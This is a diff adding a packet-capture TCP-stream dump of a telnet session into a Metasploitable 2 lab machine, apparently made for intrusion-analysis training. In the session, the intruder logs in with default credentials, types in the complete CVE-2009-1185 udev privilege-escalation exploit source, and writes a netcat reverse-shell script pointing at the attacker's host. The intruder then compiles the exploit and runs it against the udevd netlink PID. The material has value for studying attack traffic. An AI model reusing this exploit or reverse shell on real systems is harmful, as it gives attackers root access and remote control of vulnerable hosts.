@@ -1,0 +1,831 @@
+
+===================================================================
+Follow: tcp,ascii
+Filter: tcp.stream eq 10
+Node 0: 10.0.0.102:37508
+Node 1: 10.0.0.105:23
+0
+
+	0
+
+0
+
+27
+........... ..!.."..'.....#
+	0
+
+	12
+..... ..#..'
+	39
+........!.."..... .....#.....'.........
+93
+....x...... .38400,38400....#.securitynik:1....'..DISPLAY.securitynik:1......xterm-256color..
+	3
+...
+3
+...
+	3
+...
+3
+...
+	598
+                _                  _       _ _        _     _      ____  
+ _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
+| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
+| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
+|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
+                            |_|                                          
+
+
+Warning: Never expose this VM to an untrusted network!
+
+Contact: msfdev[at]metasploit.com
+
+Login with msfadmin/msfadmin to get started
+
+
+
+	22
+metasploitable login: 
+1
+m
+	1
+m
+1
+s
+	1
+s
+1
+f
+	1
+f
+1
+a
+	1
+a
+1
+d
+	1
+d
+1
+m
+	1
+m
+1
+i
+	1
+i
+1
+n
+	1
+n
+2
+.
+	2
+
+
+	10
+Password: 
+1
+m
+1
+s
+1
+f
+1
+a
+1
+d
+1
+m
+1
+i
+1
+n
+2
+.
+	2
+
+
+	513
+Last login: Sun Mar  4 13:47:58 EST 2018 from 10.0.0.102 on pts/4
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+No mail.
+
+	27
+msfadmin@metasploitable:~$ 
+1
+i
+	1
+i
+1
+d
+	1
+d
+2
+.
+	2
+
+
+	191
+uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
+
+	27
+msfadmin@metasploitable:~$ 
+1
+u
+	1
+u
+1
+n
+	1
+n
+1
+a
+	1
+a
+1
+m
+	1
+m
+1
+e
+	1
+e
+1
+ 
+	1
+ 
+1
+-
+	1
+-
+1
+-
+	1
+-
+1
+a
+	1
+a
+1
+l
+	1
+l
+1
+l
+	1
+l
+2
+.
+	2
+
+
+	90
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+
+	27
+msfadmin@metasploitable:~$ 
+1
+l
+	1
+l
+1
+s
+	1
+s
+1
+ 
+	1
+ 
+1
+/
+	1
+/
+2
+.
+	2
+
+
+	179
+0      bin   cdrom  dev  home. initrd.img  lost+found  mnt.    opt   root.srv  tmp  var
+a.tar  boot  DATA   etc  initrd  lib.     media. nohup.out  proc  sbin.sys  usr  vmlinuz
+
+	27
+msfadmin@metasploitable:~$ 
+1
+c
+	1
+c
+1
+d
+	1
+d
+1
+ 
+	1
+ 
+1
+/
+	1
+/
+2
+.
+	2
+
+
+	27
+msfadmin@metasploitable:/$ 
+1
+l
+	1
+l
+1
+s
+	1
+s
+1
+ 
+	1
+ 
+2
+.
+	2
+
+
+	179
+0      bin   cdrom  dev  home. initrd.img  lost+found  mnt.    opt   root.srv  tmp  var
+a.tar  boot  DATA   etc  initrd  lib.     media. nohup.out  proc  sbin.sys  usr  vmlinuz
+
+	27
+msfadmin@metasploitable:/$ 
+1
+c
+	1
+c
+1
+a
+	1
+a
+1
+t
+	1
+t
+1
+ 
+	1
+ 
+1
+/
+	1
+/
+1
+e
+	1
+e
+1
+t
+	1
+t
+1
+.
+	2
+c/
+1
+s
+	1
+s
+1
+h
+	1
+h
+1
+a
+	1
+a
+1
+d
+	1
+d
+1
+o
+	1
+o
+1
+w
+	1
+w
+2
+.
+	2
+
+
+	37
+cat: /etc/shadow: Permission denied
+
+	27
+msfadmin@metasploitable:/$ 
+1
+c
+	1
+c
+1
+d
+	1
+d
+1
+ 
+	1
+ 
+1
+/
+	1
+/
+1
+t
+	1
+t
+1
+m
+	1
+m
+1
+.
+	2
+p/
+2
+.
+	2
+
+
+	30
+msfadmin@metasploitable:/tmp$ 
+1
+l
+	1
+l
+1
+s
+	1
+s
+2
+.
+	2
+
+
+	14
+4453.jsvc_up
+
+	30
+msfadmin@metasploitable:/tmp$ 
+1
+t
+	1
+t
+1
+o
+	1
+o
+1
+u
+	1
+u
+1
+c
+	1
+c
+1
+h
+	1
+h
+1
+ 
+	1
+ 
+1
+a
+	1
+a
+1
+.
+	1
+.
+1
+c
+	1
+c
+1
+.
+	3
+. .
+1
+.
+	3
+. .
+1
+.
+	3
+. .
+1
+.
+	3
+. .
+1
+.
+	3
+. .
+1
+.
+	3
+. .
+1
+.
+	3
+. .
+1
+.
+	3
+. .
+1
+.
+	3
+. .
+1
+.
+	1
+.
+1
+.
+	1
+.
+1
+v
+	1
+v
+1
+i
+	1
+i
+1
+ 
+	1
+ 
+1
+a
+	1
+a
+1
+c
+	1
+c
+1
+.
+	3
+. .
+1
+.
+	1
+.
+1
+c
+	1
+c
+2
+.
+	2
+
+
+	142
+.[?1h.=.[1;29r.[m.[H.[2J.[29;1H"a.c" [New File].[2;1H.[1m~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~.[1;1H
+1
+a
+1448
+/*. * cve-2009-1185.c. *. * udev < 141 Local Privilege Escalation Exploit. * Jon Oberheide <jon@oberheide.org>. * http://jon.oberheide.org. *. * Information:. *. *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1185. *. *   udev before 1.4.1 does not verify whether a NETLINK message originates . *   from kernel space, which allows local users to gain privileges by sending . *   a NETLINK message from user space.. *. * Notes:. *   . *   An alternate version of kcope's exploit.  This exploit leverages the . *   95-udev-late.rules functionality that is meant to run arbitrary commands . *   when a device is removed.  A bit cleaner and reliable as long as your . *   distro ships that rule file.. *. *   Tested on Gentoo, Intrepid, and Jaunty.. *. * Usage:. *. *   Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, . *   usually is the udevd PID minus 1) as argv[1].. *. *   The exploit will execute /tmp/run as root so throw whatever payload you . *   want in there.. */..#include <stdio.h>.#include <string.h>.#include <stdlib.h>.#include <unistd.h>.#include <sys/types.h>.#include <sys/stat.h>.#include <sys/socket.h>.#include <linux/types.h>.#include <linux/netlink.h>..#ifndef NETLINK_KOBJECT_UEVENT.#define NETLINK_KOBJECT_UEVENT 15.#endif..int.main(int argc, char **argv).{..int sock;..char *mp, *err;..char message[4096];..struct stat st;..struct msghd
+680
+r msg;..struct iovec iovector;..struct sockaddr_nl address;...if (argc < 2) {...err = "Pass the udevd netlink PID as an argument";...printf("[-] Error: %s\n", err);...exit(1);..}...if ((stat("/etc/udev/rules.d/95-udev-late.rules", &st) == -1) &&..    (stat("/lib/udev/rules.d/95-udev-late.rules", &st) == -1)) {...err = "Required 95-udev-late.rules not found";...printf("[-] Error: %s\n", err);...exit(1);..}...if (stat("/tmp/run", &st) == -1) {...err = "/tmp/run does not exist, please create it";...printf("[-] Error: %s\n", err);...exit(1);..}..system("chmod +x /tmp/run");...memset(&address, 0, sizeof(address));..address.nl_family = AF_NETLINK;..add
+748
+ress.nl_pid = atoi(argv[1]);..address.nl_groups = 0;...msg.msg_name = (void*)&address;..msg.msg_namelen = sizeof(address);..msg.msg_iov = &iovector;..msg.msg_iovlen = 1;...sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);..bind(sock, (struct sockaddr *) &address, sizeof(address));...mp = message;..mp += sprintf(mp, "remove@/d") + 1;..mp += sprintf(mp, "SUBSYSTEM=block") + 1;..mp += sprintf(mp, "DEVPATH=/dev/foo") + 1;..mp += sprintf(mp, "TIMEOUT=10") + 1;..mp += sprintf(mp, "ACTION=remove") +1;..mp += sprintf(mp, "REMOVE_CMD=/tmp/run") +1;...iovector.iov_base = (void*)message;..iovector.iov_len = (int)(mp-message);...sendmsg(sock, &msg, 0);...close(sock);...return 0;.}..// milw0rm.com [2009-04-30]
+	910
+.[m
+        msg.msg_name = (void*)&address;
+        msg.msg_namelen = sizeof(address);
+        msg.msg_iov = &iovector;
+        msg.msg_iovlen = 1;.[6;1H.[K.[7;1H        sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
+        bind(sock, (struct sockaddr *) &address, sizeof(address));.[9;1H.[K.[10;1H        mp = message;
+        mp += sprintf(mp, "remove@/d") + 1;
+        mp += sprintf(mp, "SUBSYSTEM=block") + 1;
+        mp += sprintf(mp, "DEVPATH=/dev/foo") + 1;
+        mp += sprintf(mp, "TIMEOUT=10") + 1;
+        mp += sprintf(mp, "ACTION=remove") +1;
+        mp += sprintf(mp, "REMOVE_CMD=/tmp/run") +1;.[17;1H.[K.[18;1H        iovector.iov_base = (void*)message;
+        iovector.iov_len = (int)(mp-message);.[20;1H.[K.[21;1H        sendmsg(sock, &msg, 0);.[22;1H.[K.[23;1H        close(sock);.[24;1H.[K.[25;1H        return 0;
+}.[27;1H.[K.[28;1H// milw0rm.com [2009-04-30]
+1
+.
+	1
+.
+1
+:
+	18
+.[29;1H.[K.[29;1H:
+1
+w
+	1
+w
+1
+q
+	1
+q
+2
+.
+	8
+."a.c" 
+	66
+."a.c" [New File] 110 lines, 2768 characters written..[?1l.>.
+
+	30
+msfadmin@metasploitable:/tmp$ 
+1
+v
+	1
+v
+1
+i
+	1
+i
+1
+ 
+	1
+ 
+1
+r
+	1
+r
+1
+u
+	1
+u
+1
+n
+	1
+n
+2
+.
+	2
+
+
+	142
+.[?1h.=.[1;29r.[m.[H.[2J.[29;1H"run" [New File].[2;1H.[1m~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~.[1;1H
+1
+a
+56
+#!/bin/bash./bin/netcat 10.0.0.102 9999 -n -e /bin/bash
+	59
+.[m#!/bin/bash
+/bin/netcat 10.0.0.102 9999 -n -e /bin/bash
+1
+.
+	1
+.
+1
+:
+	18
+.[29;1H.[K.[29;1H:
+1
+w
+	1
+w
+1
+q
+	1
+q
+2
+.
+	8
+."run" 
+	62
+."run" [New File] 2 lines, 56 characters written..[?1l.>.
+
+	30
+msfadmin@metasploitable:/tmp$ 
+12
+gcc a.c -o a
+	12
+gcc a.c -o a
+2
+.
+	2
+
+
+	30
+msfadmin@metasploitable:/tmp$ 
+21
+cat /proc/net/netlink
+	21
+cat /proc/net/netlink
+2
+.
+	2
+
+
+	594
+sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
+de30c800 0   0      00000000 0        0        00000000 2
+dd117400 4   0      00000000 0        0        00000000 2
+dd595800 7   0      00000000 0        0        00000000 2
+ddc03600 9   0      00000000 0        0        00000000 2
+de3fb400 10  0      00000000 0        0        00000000 2
+de30cc00 15  0      00000000 0        0        00000000 2
+df8d7600 15  2293   00000001 0        0        00000000 2
+de338800 16  0      00000000 0        0        00000000 2
+dd13b600 18  0      00000000 0        0        00000000 2
+
+	30
+msfadmin@metasploitable:/tmp$ 
+1
+p
+	1
+p
+1
+s
+	1
+s
+1
+ 
+	1
+ 
+1
+a
+	1
+a
+1
+u
+	1
+u
+1
+x
+	1
+x
+1
+ 
+	1
+ 
+1
+|
+	1
+|
+1
+ 
+	1
+ 
+1
+g
+	1
+g
+1
+r
+	1
+r
+1
+e
+	1
+e
+1
+p
+	1
+p
+1
+ 
+	1
+ 
+1
+u
+	1
+u
+1
+d
+	1
+d
+1
+e
+	1
+e
+1
+v
+	1
+v
+2
+.
+	2
+
+
+	87
+root      2294  0.0  0.1   2092   636 ?        S<s  11:47   0:00 /sbin/udevd --daemon
+
+	76
+msfadmin  6318  0.0  0.1   3004   752 pts/4    R+   14:08   0:00 grep udev
+
+	30
+msfadmin@metasploitable:/tmp$ 
+1
+.
+	1
+.
+1
+/
+	1
+/
+1
+a
+	1
+a
+1
+.
+	1
+ 
+1
+2
+	1
+2
+1
+2
+	1
+2
+1
+9
+	1
+9
+1
+3
+	1
+3
+2
+.
+	2
+
+
+	30
+msfadmin@metasploitable:/tmp$ 
+===================================================================
